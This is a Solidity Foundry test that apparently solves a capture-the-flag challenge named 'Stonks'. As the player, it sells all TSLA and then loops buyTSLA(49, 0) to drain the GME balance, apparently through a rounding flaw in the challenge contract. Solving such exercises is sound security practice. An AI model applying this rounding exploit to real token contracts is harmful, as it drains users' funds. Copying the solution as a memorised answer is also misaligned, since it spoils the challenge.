// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Stonks.sol";

contract StonksTest is Test {
    Stonks public target;
    address public player;

    function setUp() public {
        player = vm.addr(1);
        target = new Stonks(player);

        vm.label(address(target), "Challenge");
        vm.label(player, "Player");
    }

    function testStonks() public {
        vm.startPrank(player);

        uint256 TSLA_TICKER = 0;
        uint256 GME_TICKER = 1;
        uint256 ORACLE_TSLA_GME = 50;

        target.sellTSLA(
            target.balanceOf(player, TSLA_TICKER),
            target.balanceOf(player, TSLA_TICKER) * ORACLE_TSLA_GME
        );

        while (target.balanceOf(player, GME_TICKER) >= 49) {
            target.buyTSLA(49, 0);
        }

        target.buyTSLA(target.balanceOf(player, GME_TICKER), 0);

        assertTrue(
            target.balanceOf(player, TSLA_TICKER) == 0 &&
                target.balanceOf(player, GME_TICKER) == 0
        );

        vm.stopPrank();
    }
}
